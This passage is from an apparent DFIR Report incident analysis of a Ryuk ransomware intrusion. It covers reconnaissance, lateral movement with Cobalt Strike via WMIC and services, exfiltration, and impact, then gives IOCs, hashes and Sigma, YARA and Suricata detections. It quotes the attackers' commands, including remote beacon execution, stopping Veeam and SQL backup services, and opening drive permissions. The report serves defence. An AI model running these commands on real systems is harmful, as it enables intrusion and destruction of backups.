<pre>Get-NetSubnet<br />Get-NetComputer -operatingsystem *server*<br />Invoke-CheckLocalAdminAccess<br />Find-LocalAdminAccess </pre>
<p>WMI was used to check for the current AntiVirus on numerous systems</p>
<pre>WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</pre>
<p>
</p>
<p><img loading="lazy" class="alignnone size-full wp-image-925 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon.png" alt width="967" height="321" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon.png 967w, https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon-300x100.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon-768x255.png 768w" data-lazy-sizes="(max-width: 967px) 100vw, 967px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-925" src="https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon.png" alt="" width="967" height="321" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon.png 967w, https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon-300x100.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/cs-recon-768x255.png 768w" sizes="(max-width: 967px) 100vw, 967px" /></noscript></p>
<pre>Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate | Export-CSV C:\Users\AllWindows.csv -NoTypeInformation -Encoding UTF8</pre>
<h3 class="tactic-cell" aria-describedby="cdk-describedby-message-28">Lateral Movement</h3>
<p>On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery. The system was not vulnerable to MS17-010 </p>
<p>Lateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller. From there, the threat actor used WMIC to execute the beacon.</p>
<pre class="truncate-by-height">WMIC /node:\"DC.example.domain\" process call create \"rundll32 C:\\PerfLogs\\arti64.dll, StartW\"</pre>
<p>This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service.png"><img loading="lazy" class="alignnone wp-image-920 size-full jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service.png" alt width="1530" height="519" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service.png 1530w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service-300x102.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service-1024x347.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service-768x261.png 768w" data-lazy-sizes="(max-width: 1530px) 100vw, 1530px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone wp-image-920 size-full" src="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service.png" alt="" width="1530" height="519" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service.png 1530w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service-300x102.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service-1024x347.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-lat-service-768x261.png 768w" sizes="(max-width: 1530px) 100vw, 1530px" /></noscript></a></p>
<p>The decoded Powershell.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell.png"><img loading="lazy" class="alignnone wp-image-921 size-full jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell.png" alt width="1906" height="766" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell.png 1906w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-300x121.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-1024x412.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-768x309.png 768w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-1536x617.png 1536w" data-lazy-sizes="(max-width: 1906px) 100vw, 1906px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone wp-image-921 size-full" src="https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell.png" alt="" width="1906" height="766" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell.png 1906w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-300x121.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-1024x412.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-768x309.png 768w, https://thedfirreport.com/wp-content/uploads/2020/10/decoded-powershell-1536x617.png 1536w" sizes="(max-width: 1906px) 100vw, 1906px" /></noscript></a></p>
<p>Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.</p>
<p><img loading="lazy" class="alignnone size-full wp-image-923 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/smblat1.png" alt width="608" height="184" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/smblat1.png 608w, https://thedfirreport.com/wp-content/uploads/2020/10/smblat1-300x91.png 300w" data-lazy-sizes="(max-width: 608px) 100vw, 608px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/smblat1.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-923" src="https://thedfirreport.com/wp-content/uploads/2020/10/smblat1.png" alt="" width="608" height="184" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/smblat1.png 608w, https://thedfirreport.com/wp-content/uploads/2020/10/smblat1-300x91.png 300w" sizes="(max-width: 608px) 100vw, 608px" /></noscript></p>
<p><img loading="lazy" class="alignnone size-full wp-image-1024 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/service.png" alt width="437" height="56" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/service.png 437w, https://thedfirreport.com/wp-content/uploads/2020/10/service-300x38.png 300w" data-lazy-sizes="(max-width: 437px) 100vw, 437px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/service.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-1024" src="https://thedfirreport.com/wp-content/uploads/2020/10/service.png" alt="" width="437" height="56" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/service.png 437w, https://thedfirreport.com/wp-content/uploads/2020/10/service-300x38.png 300w" sizes="(max-width: 437px) 100vw, 437px" /></noscript></p>
<p>At this point, C2 connections appear on the domain controller connecting to <span class="all-copy" data-v-6144aac9="">martahzz[.]com &#8211; </span>88.119.171[.]75 over 443/https. </p>
<p>Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.</p>
<p>The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.</p>
<pre class="truncate-by-height">C:\Windows\system32\cmd.exe /C dir \\Server\c$</pre>
<p>
</p>
<h3><a>Command and Control</a></h3>
<p><strong>Bazar:</strong></p>
<p>5.182.210.145|443</p>
<p>Certificate [<span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">ec:4c:07:b8:3b:6a:a0:bf:60:36:b7:f4:92:9e:83:81:0f:96:46:b0</span></a> </span></span>]</p>
<p>Not Before <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">2020/09/21 05:24:24 UTC</span></a> </span></span></p>
<p>Not After <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">2021/09/21 05:24:24 UTC</span></a> </span></span></p>
<p>Issuer Org <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">Global Security</span></a> </span></span></p>
<p>Subject Common <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">example.com</span></a> </span></span></p>
<p>Subject Org <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">Global Security</span></a> </span></span></p>
<p>Public Algorithm <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">rsaEncryption</span></a></span></span></p>
<p>JA3: 72a589da586844d7f0818ce684948eea</p>
<p>JA3s: e35df3e00ca4ef31d42b34bebaa2f86e</p>
<p><strong>Cobalt strike:</strong></p>
<p>88.119.171.75|443</p>
<p>Certificate [<span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">ee:92:91:6b:7e:31:85:22:65:eb:16:11:c4:8f:0a:75:c9:05:1d:4b</span></a> </span></span>]</p>
<p>Not Before <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">2020/09/29 08:18:03 UTC</span></a> </span></span></p>
<p>Not After <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">2021/09/29 08:18:03 UTC</span></a> </span></span></p>
<p>Issuer Org <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">lol</span></a> </span></span></p>
<p>Subject Common <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">martahzz.com</span></a> </span></span></p>
<p>Subject Org <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">lol</span></a> </span></span></p>
<p>Public Algorithm <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">rsaEncryption</span></a></span></span></p>
<p>JA3 : a0e9f5d64349fb13191bc781f81f42e1</p>
<p>JA3s: ae4edc6faf64d08308082ad26be60767</p>
<p>107.173.58.183|443</p>
<p>Certificate [<span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">e2:13:2c:a4:29:ae:f3:fa:35:1f:e1:5b:2c:25:76:57:37:5b:dc:35</span></a> </span></span>]</p>
<p>Not Before <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">2020/09/22 14:34:11 UTC</span></a> </span></span></p>
<p>Not After <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">2021/09/22 14:34:11 UTC</span></a> </span></span></p>
<p>Issuer Org <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">lol</span></a> </span></span></p>
<p>Subject Common <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">nomadfunclub.com</span></a> </span></span></p>
<p>Subject Org <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">lol</span></a> </span></span></p>
<p>Public Algorithm <span class="detail-field" data-v-6144aac9=""><span class="field cursor-pointer" data-v-6144aac9=""><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">rsaEncryption</span></a></span></span></p>
<p>JA3: a0e9f5d64349fb13191bc781f81f42e1</p>
<p>JA3s: ae4edc6faf64d08308082ad26be60767</p>
<h3><a>Exfiltration</a></h3>
<p>Domain discovery (AdFind and Rubeus outputs) exfiltrated by vsftpd to 45.141.84[.]120. </p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2020/10/ftp.png"><img loading="lazy" class="alignnone wp-image-1005 size-full jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/ftp.png" alt width="1320" height="430" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/ftp.png 1320w, https://thedfirreport.com/wp-content/uploads/2020/10/ftp-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/ftp-1024x334.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/ftp-768x250.png 768w" data-lazy-sizes="(max-width: 1320px) 100vw, 1320px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/ftp.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone wp-image-1005 size-full" src="https://thedfirreport.com/wp-content/uploads/2020/10/ftp.png" alt="" width="1320" height="430" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/ftp.png 1320w, https://thedfirreport.com/wp-content/uploads/2020/10/ftp-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/ftp-1024x334.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/ftp-768x250.png 768w" sizes="(max-width: 1320px) 100vw, 1320px" /></noscript></a></p>
<h3><a>Impact</a></h3>
<p>SMB was used to transfer the Ryuk executables. Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers. On the backup server, prior to execution, the threat actors pulled up the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin" target="_blank" rel="noopener noreferrer">wbadmin</a> msc console.</p>
<p>Commands ran prior to ransom execution:</p>
<pre>"C:\Windows\system32\net1 stop \""samss\"" /y"<br />"C:\Windows\system32\net1 stop \""veeamcatalogsvc\"" /y"<br />"C:\Windows\system32\net1 stop \""veeamcloudsvc\"" /y"<br />"C:\Windows\system32\net1 stop \""veeamdeploysvc\"" /y"<br />"C:\Windows\System32\net.exe\"" stop \""samss\"" /y"<br />"C:\Windows\System32\net.exe\"" stop \""veeamcatalogsvc\"" /y"<br />"C:\Windows\System32\net.exe\"" stop \""veeamcloudsvc\"" /y"<br />"C:\Windows\System32\net.exe\"" stop \""veeamdeploysvc\"" /y"<br />"C:\Windows\System32\taskkill.exe\"" /IM sqlbrowser.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM sqlceip.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM sqlservr.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM sqlwriter.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.agent.configurationservice.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.brokerservice.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.catalogdataservice.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.cloudservice.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.externalinfrastructure.dbprovider.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.manager.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.mountservice.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.service.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.uiserver.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.backup.wmiserver.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeamdeploymentsvc.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeamfilesysvsssvc.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeam.guest.interaction.proxy.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeamnfssvc.exe /F"<br />"C:\Windows\System32\taskkill.exe\"" /IM veeamtransportsvc.exe /F"<br />"C:\Windows\system32\taskmgr.exe\"" /4"<br />"C:\Windows\system32\wbem\wmiprvse.exe -Embedding"<br />"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding"<br />"icacls \""C:\*\"" /grant Everyone:F /T /C /Q"<br />"icacls \""D:\*\"" /grant Everyone:F /T /C /Q"</pre>
<p>
</p>
<figure></figure>
<figure>All systems were left with the following ransom note:</figure>
<p>&nbsp;</p>
<figure class="wp-block-image size-large"><img loading="lazy" class="alignnone size-full wp-image-1013 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png" alt width="1093" height="587" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png 1093w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-300x161.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-1024x550.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-768x412.png 768w" data-lazy-sizes="(max-width: 1093px) 100vw, 1093px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="alignnone size-full wp-image-1013" src="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png" alt="" width="1093" height="587" srcset="https://thedfirreport.com/wp-content/uploads/2020/10/ryuk.png 1093w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-300x161.png 300w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-1024x550.png 1024w, https://thedfirreport.com/wp-content/uploads/2020/10/ryuk-768x412.png 768w" sizes="(max-width: 1093px) 100vw, 1093px" /></noscript></figure>
<p>
</p>
<p>The threat actors asked for more than $6 million but were willing to negotiate.</p>
<p>
</p>
<p>Enjoy our report? Please consider donating $1 or more to the project using <a href="https://www.patreon.com/thedfirreport" target="_blank" rel="noreferrer noopener">Patreon</a>. Thank you for your support!</p>
<p>We also have PCAPs, files, memory images, Kape and Redline packages available <a href="https://thedfirreport.com/services/" target="_blank" rel="noopener">here</a>.</p>
<h2>IOCs</h2>
<p><a href="https://otx.alienvault.com/pulse/5f7f039322d638212355d28a" target="_blank" rel="noopener noreferrer">https://otx.alienvault.com/pulse/5f7f039322d638212355d28a</a></p>
<p><a href="https://misppriv.circl.lu/events/view/79958" target="_blank" rel="noopener noreferrer">https://misppriv.circl.lu/events/view/79958</a></p>
<p>
</p>
<h3>Network</h3>
<pre>5.182.210.145<br />88.119.171.75<br />107.173.58.183<br />45.141.84.120<br /><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">nomadfunclub.com</span></a><br /><a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">martahzz.com<br /></span></a>.<a class="value" data-v-6144aac9=""><span class="all-copy" data-v-6144aac9="">bazar</span></a></pre>
<p>
</p>
<h3>File</h3>
<pre>Document-Preview.exe
40b17d4ca83f079cf6b2b09d7a7fd839
090e82a47b32dc94d71d4c84a3a76d2480589b00
85ef348d39610c1d5f58e2524c0e929ec815a9fbe1f5924cdef7a0c05e58e5ad
c5af8f6ae345f453442a3bbe8189c42ad3c7d4d89231607f78a1b6f24173679e38ac08d26294f46de98358b0aa560f33be5708becd2a632f6657c9bbbbc0d995
6144:HF5dJ89Rl3FtuK0cuVxtIIOxK6xOMjKBxMkUcYBMcoPRxDu3fXtjpamF:HFp4Rl36KNoxwxNmBWcYBhdlpF
fx16_multi_for_crypt_x86.exe
fc9f8bf3fcae4bf65150bff296b5e271
308261d2539dba9814aa28c458970beb00cc2864
f7998c8b083b31e8b0e8eaf197f6db65b100d44d94700e0780e81c7d54eefcf5
4f60d3a0ca16242a3916675f93d16ee29f423d46deef81cad6da32c325d261cf204e94baf958383305dd3df33900d913676fd104c70a4c46ca2f18642e64bd5e
3072:AWh32QAodpLae6PEd0YstWTWlbkPn3aT3TFw:Jh32QAod5ae6P9YstVr<br />arti64.dll<br />fc646e042c545be6f7e5bdcb3ecf64c7
b5cdf571944f889e4369329aa01376e2204c01f0
f22449c01f8233ea7c85a49f2b6b5fedd304fca5c0e58176bafda9218873c2dd
8ddc48f4c5db09fc60053554487708fa5226e253edb64ace9e6fa0c3ea370df1bfd8e994cab0822feac494d71d7d730926738c902b3788efb5f6719c5d2da9e2
6144:4MB168YZHFXFxaSjx9nDPAhgaa0rEAmrSWLeLITo0:4MB168UlraSzrAhY+EAwSp0
P64.exe
9ff18f7a19e06b602e19b9e0aca3ad84
bcbb5bbc55b4f44397c34e9fca2017587e69219b
9d8cbb2bf4801276de2143ccd64a7d0f66263809a90bea0b664282a15d121d9e
157b06e75a3977e80866058111768508c643ccea681cf324d770865b3b1d354e233088b2391020f2e988f650344e263e8b9b0fcbc8c70a381ec98fa2eb256bac
6144:Y52fXQtuKHZg9i/uu3cJfWCcIzZzvvnpPWyxXf7uByC:YmQtuKHP/AJuKZvVWmicadf.bat<br />adf.bat<br />b94bb0ae5a8a029ba2fbb47d055e22bd<br />035940bd120a72e2da1b6b7bb8b4efab46232761<br />f6a377ba145a5503b5eb942d17645502eddf3a619d26a7b60df80a345917aaa2<br />a8e5b535711268a0b82988259fbedc0211e0e55b5bf2d16ddcc21dae82f0312e178faee1b39ebec7fba5db4e36d9ad9618eae5c3a39a3536fff254eb0945c5dc<br />6:81ykqi23fVxJfke9Nm0Lal9c9Nmw+IFc9NQ0LbyqAc9NCR+KsEc9NamWM5c9Nm0e:KqZxiZlpBIG21sSmz8yT1V</pre>
<p>
</p>
<h2>Detections</h2>
<p>
</p>
<h3>Network</h3>
<pre class="c-mrkdwn__pre" data-stringify-type="pre">ET INFO Observed DNS Query for EmerDNS_TLD (.bazar)<br />ETPRO POLICY Possibly Suspicious example.com SSL Cert<br />ET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex/Trickbot CnC)<br />ETPRO TROJAN Observed Malicious SSL Cert (Cobalt Strike CnC)<br />Feodo Tracker: potential TrickBot CnC Traffic_detected<br />ET NETBIOS DCERPC SVCCTL - Remote Service Control Manager Access<br />ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement<br />ET POLICY SMB2 NT Create AndX Request For an Executable File<br />ET POLICY SMB2 NT Create AndX Request For an Executable File In a Temp Directory<br />ET POLICY RunDll Request Over SMB - Likely Lateral Movement<br />GPL NETBIOS SMB-DS IPC$ share access<br />ET CNC Feodo Tracker Reported CnC Server TCP group 15<br />ET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (Generic Flags)<br />ET EXPLOIT Possible ETERNALBLUE Probe MS17-010 (MSF style)<br />ET POLICY Command Shell Activity Over SMB - Possible Lateral Movement</pre>
<p>
</p>
<h3>Sigma</h3>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_suspicious_parameter_variation.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_suspicious_parameter_variation.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/82cae6d63c9c2f6d3e86c57e11497d86279b9f95/rules/windows/process_creation/win_susp_wmi_execution.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/82cae6d63c9c2f6d3e86c57e11497d86279b9f95/rules/windows/process_creation/win_susp_wmi_execution.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/other/win_defender_disabled.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/other/win_defender_disabled.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/win_mal_ryuk.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/win_mal_ryuk.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_shellcode_b64.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_shellcode_b64.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_net_execution.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_net_execution.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_whoami.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_whoami.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_trust_discovery.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_trust_discovery.yml</a></p>
<p><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_whoami_as_system.yml" target="_blank" rel="noopener noreferrer">https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_whoami_as_system.yml</a></p>
<p>Detects AdFind usage from a past case:</p>
<pre>title: AdFind Recon<br />description: Threat Actor using AdFind for reconnaissance. <br />author: The DFIR Report<br />date: 2019/8/2<br />references:<br />    - https://thedfirreport.com/2020/08/03/dridex-from-word-to-domain-dominance/<br />tags:<br />    - attack.remote_system_discovery<br />    - attack.T1018<br />logsource:<br />    category: process_creation<br />    product: windows<br />detection:<br />    selection_1:<br />        CommandLine|contains:<br />            - adfind -f objectcategory=computer<br />    selection_2:<br />        CommandLine|contains:<br />            - adfind -gcb -sc trustdmp<br />    condition: selection_1 or selection_2 <br />falsepositives:<br />    - Legitimate Administrator using tool for Active Directory querying<br />level: medium<br />status: experimental</pre>
<p>
</p>
<h3>Yara</h3>
<pre>/*<br />YARA Rule Set<br />Author: The DFIR Report<br />Date: 2020-10-04<br />Identifier: exes<br />Reference: https://thedfirreport.com<br />*/<br /><br />/* Rule Set ----------------------------------------------------------------- */<br /><br />import "pe"<br /><br />rule ryuk_exes_P64 {<br />meta:<br />description = "exes - file P64.exe"<br />author = "The DFIR Report"<br />reference = "https://thedfirreport.com"<br />date = "2020-10-04"<br />hash1 = "9d8cbb2bf4801276de2143ccd64a7d0f66263809a90bea0b664282a15d121d9e"<br />strings:<br />$s1 = "MultiReco.exe" fullword ascii<br />$s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii<br />$s3 = "B:\\x64\\cpp\\x64\\Release\\MultiReco.pdb" fullword ascii<br />$s4 = "AppPolicyGetThreadInitializationType" fullword ascii<br />$s5 = "`template-parameter-" fullword ascii<br />$s6 = "Error initializing the common controls." fullword wide<br />$s7 = "Error reading data from the file." fullword wide<br />$s8 = "operator&lt;=&gt;" fullword ascii<br />$s9 = "operator co_await" fullword ascii<br />$s10 = "AppPolicyGetWindowingModel" fullword ascii<br />$s11 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii<br />$s12 = "noexcept" fullword ascii<br />$s13 = "Error opening the file!" fullword wide<br />$s14 = "Error creating the window" fullword wide<br />$s15 = "Error creating new stroke collection." fullword wide<br />$s16 = "Failed connect to the recognition context's event source." fullword wide<br />$s17 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide<br />$s18 = "Failed to add the strokes to the Ink object's custom stroke collection" fullword wide<br />$s19 = "Failed to attach the stroke collection to the recognition context" fullword wide<br />$s20 = "Error loading ink object from the file." fullword wide<br />condition:<br />uint16(0) == 0x5a4d and filesize &lt; 2000KB and<br />( pe.imphash() == "c30bbd53e939306589cfb6ee8f94434f" and pe.exports("SDqwsgrfTRRADQDSwatuHdfCxv") or all of them )<br 